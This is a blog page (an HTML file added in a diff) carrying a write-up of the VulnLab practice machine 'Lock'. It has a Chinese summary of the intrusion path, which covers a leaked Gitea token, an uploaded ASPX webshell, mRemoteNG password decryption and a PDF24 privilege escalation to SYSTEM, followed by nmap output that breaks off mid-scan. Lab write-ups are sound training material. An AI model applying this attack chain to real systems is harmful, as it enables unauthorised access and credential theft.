@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;e7bede91-b32d-4929-882a-19e82534e89b 80 端口似乎沒有實質內容，而在 3000 端口中，歷史提交記錄顯示出一個 token，這使得可以訪問原始文件並下載。嘗試在本地運行後，發現用戶還有一個名為 “website” 的項目，並且可以使用該 token 進行 git clone">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Lock">
+<meta property="og:url" content="https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;e7bede91-b32d-4929-882a-19e82534e89b 80 端口似乎沒有實質內容，而在 3000 端口中，歷史提交記錄顯示出一個 token，這使得可以訪問原始文件並下載。嘗試在本地運行後，發現用戶還有一個名為 “website” 的項目，並且可以使用該 token 進行 git clone">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020426-yrxvxfq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102004853-ibfbt2q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102004947-otmye13.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005000-gtjmt2x.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005015-25dnsc0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005659-wcaqie6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005709-lwlcfim.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005717-rcafdvt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010233-jwbdff4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010337-yikseo0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102235257-gel5u51.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010524-tiipuny.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010549-z8sfsbn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010558-d2yhrtp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010613-wkvrtse.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010624-ek907f1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010757-qhf9x9n.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010919-5m8d2e5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102011324-ktra236.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102011434-6sq339n.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102235807-w29kmil.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102012051-z3obp6i.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020508-b51szms.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102013744-hpc7y2x.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102013822-1cfjfm2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102013933-5tf0lx1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102014116-wdjm1im.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102014220-1q50xo4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102014309-b91dzoo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250103000308-llaysp0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015628-890oxxt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250103000502-yf2b2u0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015726-kwenkea.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015711-nckjqiv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015800-jblubln.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020012-8h4zpdd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250103000804-liq3s14.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020125-62o7an8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020222-gblrcgl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020253-b7kuka3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020314-yzzz9ll.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020337-oqh1wh9.png">
+<meta property="article:published_time" content="2025-01-02T19:48:00.000Z">
+<meta property="article:modified_time" content="2025-01-02T19:50:44.293Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020426-yrxvxfq.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Lock</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/03/2025/08-vulnlab-manage/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/03/2025/06-vulnlab-forgotten/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&text=VulnLab - Machine - Lock"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&is_video=false&description=VulnLab - Machine - Lock"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Lock&body=Check out this article: https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&name=VulnLab - Machine - Lock&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&t=VulnLab - Machine - Lock"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Lock
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-02T19:48:00.000Z" class="dt-published" itemprop="datePublished">2025-01-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020426-yrxvxfq.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=e7bede91-b32d-4929-882a-19e82534e89b">https://api.vulnlab.com/api/v1/share?id=e7bede91-b32d-4929-882a-19e82534e89b</a></p>
+<p>80 端口似乎沒有實質內容，而在 3000 端口中，歷史提交記錄顯示出一個 token，這使得可以訪問原始文件並下載。嘗試在本地運行後，發現用戶還有一個名為 “website” 的項目，並且可以使用該 token 進行 git clone 操作。通過 Visual Studio Code 檢查修改內容後，得知網站會自動同步項目變更，這使得可以隨意修改 changelog.txt 文件，並成功提交更改。當再次訪問時，確認修改已生效。進一步檢查服務器，發現其為 IIS 服務器，並上傳了一個 ASPX 的 shell，從而獲得了 webshell。隨後，進入 C:\gitea\data 目錄，發現了 gitea.db 數據庫文件，下載後嘗試利用 hashcat 破解 hash，但未能成功。於是，改變管理員密碼並成功登錄，然而發現內部並無有用信息。在 C:\users 目錄下檢查時，發現了一個 config.xml 文件，該文件指向 mRemoteNG 軟件，經過解密後獲得了 Gale.Dekarios 的密碼，並成功使用 RDP 進行連接。連接後發現 PDF24 軟件，並尋找相關漏洞，最終找到了一個本地特權提升的漏洞，通過尋找原始安裝文件並利用特定的步驟，最終獲得了 NT SYSTEM 權限，進而提取到了 root.txt 文件。</p>
+<h1 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="line">|_http-title: Lock - Index</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3000/tcp open  ppp?          syn-ack ttl 127</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, RTSPRequest:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Set-Cookie: i_like_gitea=3fb257f7e4944846; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     Set-Cookie: _csrf=Yor2r4Gajh3LlnJud9L4jA66M7A6MTczNTc1MDQyNjYwNzY3NjMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Wed, 01 Jan 2025 16:53:46 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;en-US&quot;</span> class=<span class="string">&quot;theme-auto&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;manifest&quot;</span> href=<span class="string">&quot;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU</span></span><br><span class="line"><span class="string">|   HTTPOptions:</span></span><br><span class="line"><span class="string">|     HTTP/1.0 405 Method Not Allowed</span></span><br><span class="line"><span class="string">|     Allow: HEAD</span></span><br><span class="line"><span class="string">|     Allow: HEAD</span></span><br><span class="line"><span class="string">|     Allow: GET</span></span><br><span class="line"><span class="string">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span></span><br><span class="line"><span class="string">|     Set-Cookie: i_like_gitea=c17a643cc38f39c3; Path=/; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     Set-Cookie: _csrf=U8t3ZO7IKDJvomM4IFah3rUtk_Y6MTczNTc1MDQzMjQ2NTk4MTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     X-Frame-Options: SAMEORIGIN</span></span><br><span class="line"><span class="string">|     Date: Wed, 01 Jan 2025 16:53:52 GMT</span></span><br><span class="line"><span class="string">|_    Content-Length: 0</span></span><br><span class="line"><span class="string">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=Lock</span></span><br><span class="line"><span class="string">| Issuer: commonName=Lock</span></span><br><span class="line"><span class="string">| Public Key type: rsa</span></span><br><span class="line"><span class="string">| Public Key bits: 2048</span></span><br><span class="line"><span class="string">| Signature Algorithm: sha256WithRSAEncryption</span></span><br><span class="line"><span class="string">| Not valid before: 2024-12-31T16:45:24</span></span><br><span class="line"><span class="string">| Not valid after:  2025-07-02T16:45:24</span></span><br><span class="line"><span class="string">| MD5:   204d:8bdc:44aa:daff:8526:b18b:1a90:c49f</span></span><br><span class="line"><span class="string">| SHA-1: 0588:b8ab:1f07:6df2:e3ed:0082:401f:80a0:5859:17a1</span></span><br><span class="line"><span class="string">| -----BEGIN CERTIFICATE-----</span></span><br><span class="line"><span class="string">| MIICzDCCAbSgAwIBAgIQG5HRK636hLBPlNxjIEiUgTANBgkqhkiG9w0BAQsFADAP</span></span><br><span class="line"><span class="string">| MQ0wCwYDVQQDEwRMb2NrMB4XDTI0MTIzMTE2NDUyNFoXDTI1MDcwMjE2NDUyNFow</span></span><br><span class="line"><span class="string">| DzENMAsGA1UEAxMETG9jazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB</span></span><br><span class="line"><span class="string">| ANqxQu6wg5XRLOWEtLFVtyYrMN1YwXhJD+pBbHK7AnS4WsGRUOqQtwE6ceW+QEr9</span></span><br><span class="line"><span class="string">| Ol85fzfL9BzLUEqjEf2kpEtEq+P3c8EerFya3YbgjIDLLc9qvPkZ4AIIQgYswcdB</span></span><br><span class="line"><span class="string">| mE+DCu6Xq+1tJT3p190BbUr5qn5yvdhPX9g+4SzXpaPRw/Q/08fcPrlrcxnTwe22</span></span><br><span class="line"><span class="string">| BAQhlgx3FtyTGx5rFplGUSATyNToTWNS4EEpZ7MCExfSexZ03sLCl3M0y2dL9+I1</span></span><br><span class="line"><span class="string">| 1GI2lJlId2aGGij9g0yd0rlbDlhVpufBfqUZZb+6xC3mnukkdT+hcePoeDDykd5w</span></span><br><span class="line"><span class="string">| sEy9slD8btiQ5ThYvTpDuUECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw</span></span><br><span class="line"><span class="string">| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQB4v/ZIsHuIdrQkbv4069+m</span></span><br><span class="line"><span class="string">| 3hTZamNOcu6PXp5rMjgsg366dPpV51CuplVtpimMomd/hi8aD1d+UKIFdBsQvAES</span></span><br><span class="line"><span class="string">| y8IiGVoYlzvaYSJZo1RxFWlUNEoi2Ex8dDea94BS7obyELNts9km9k87A0l4bM99</span></span><br><span class="line"><span class="string">| trnNmG4gk3B7bXcxm+Qyvq1L3KsPCjLdvOeso0gCMp8bwFvdlb46IwSvxuiQckuF</span></span><br><span class="line"><span class="string">| RObUDWBYftEK29k4aj2CjsnscsVfX2USfUandcJJQSmexRm5p0zLZW3fBo9Vg2uH</span></span><br><span class="line"><span class="string">| 1yjS7gxl2zkOq988Yzk3BEEQnHs0IryYyekSxJ1rBHn3mTACU6iWC6O1Xp56BY0k</span></span><br><span class="line"><span class="string">|_-----END CERTIFICATE-----</span></span><br><span class="line"><span class="string">| rdp-ntlm-info:</span></span><br><span class="line"><span class="string">|   Target_Name: LOCK</span></span><br><span class="line"><span class="string">|   NetBIOS_Domain_Name: LOCK</span></span><br><span class="line"><span class="string">|   NetBIOS_Computer_Name: LOCK</span></span><br><span class="line"><span class="string">|   DNS_Domain_Name: Lock</span></span><br><span class="line"><span class="string">|   DNS_Computer_Name: Lock</span></span><br><span class="line"><span class="string">|   Product_Version: 10.0.20348</span></span><br><span class="line"><span class="string">|_  System_Time: 2025-01-01T16:55:14+00:00</span></span><br><span class="line"><span class="string">|_ssl-date: 2025-01-01T16:55:53+00:00; -4s from scanner time.</span></span><br><span class="line"><span class="string">5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-title: Service Unavailable</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span 